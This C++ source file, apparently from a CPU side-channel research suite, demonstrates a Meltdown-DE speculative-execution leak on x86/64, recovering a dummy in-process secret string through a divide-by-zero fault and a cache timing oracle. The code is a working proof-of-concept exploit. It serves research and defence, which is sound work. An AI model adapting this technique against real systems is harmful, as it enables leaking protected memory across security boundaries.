/*
 * Copyright 2019 Google LLC
 *
 * Licensed under both the 3-Clause BSD License and the GPLv2, found in the
 * LICENSE and LICENSE.GPL-2.0 files, respectively, in the root directory.
 *
 * SPDX-License-Identifier: BSD-3-Clause OR GPL-2.0
 */

/**
 * Demonstrates the Meltdown-DE on x86/64.
 * We exploit the fact that on all CPUs vulnerable to Meltdown-DE (and known to
 * us) holds that:
 * 2 % 0 = 2
 * Therefore we accomodate the private data to be stored in multiple strings
 * where the secret data is on index 2 (first two indices contain dummy data).
 * Then we speculatively access those unreachable characters in a loop.
 **/

#include "compiler_specifics.h"

#if !SAFESIDE_IA32 && !SAFESIDE_X64
#  error Unsupported architecture. x86/64 required.
#endif

#include <array>
#include <cstring>
#include <iostream>

#include "cache_sidechannel.h"
#include "faults.h"
#include "instr.h"
#include "utils.h"

const char *public_data = "Hello, world!";

constexpr size_t kPrivateDataLength = 16;

// First two characters of each string are always dummy.
const char *private_data[kPrivateDataLength] = {
  "XXI",
  "XXt",
  "XX'",
  "XXs",
  "XX ",
  "XXa",
  "XX ",
  "XXs",
  "XXe",
  "XXc",
  "XXr",
  "XXe",
  "XXt",
  "XX!",
  "XX!",
  "XX!",
};

// We must store zero and one as a global variables to avoid optimizing them
// out.
size_t zero = 0;
size_t two = 2;

static char LeakByte(size_t offset) {
  CacheSideChannel sidechannel;
  const std::array<BigByte, 256> &isolated_oracle = sidechannel.GetOracle();

  for (int run = 0;; ++run) {
    size_t safe_offset = run % strlen(public_data);
    sidechannel.FlushOracle();

    bool handled_fault = RunWithFaultHandler(SIGFPE, [&]() {
      ForceRead(isolated_oracle.data() + static_cast<size_t>(
          public_data[safe_offset]));

      // This fails with division exception. Whatever is the result of 1 % 0, it
      // cannot be more than 1 and first two characters are dummy in each
      // private string. During the modulo by zero, SIGFPE is raised.
      ForceRead(isolated_oracle.data() + static_cast<size_t>(
          private_data[offset][two % zero]));
    });

    if (!handled_fault) {
      std::cerr << "Read didn't yield expected fault" << std::endl;
      exit(EXIT_FAILURE);
    }

    std::pair<bool, char> result =
        sidechannel.RecomputeScores(public_data[safe_offset]);

    if (result.first) {
      return result.second;
    }

    if (run > 100000) {
      std::cerr << "Does not converge " << result.second << std::endl;
      exit(EXIT_FAILURE);
    }
  }
}

int main() {
  std::cout << "Leaking the string: ";
  std::cout.flush();
  for (size_t i = 0; i < kPrivateDataLength; ++i) {
    std::cout << LeakByte(i);
    std::cout.flush();
  }
  std::cout << "\nDone!\n";
}
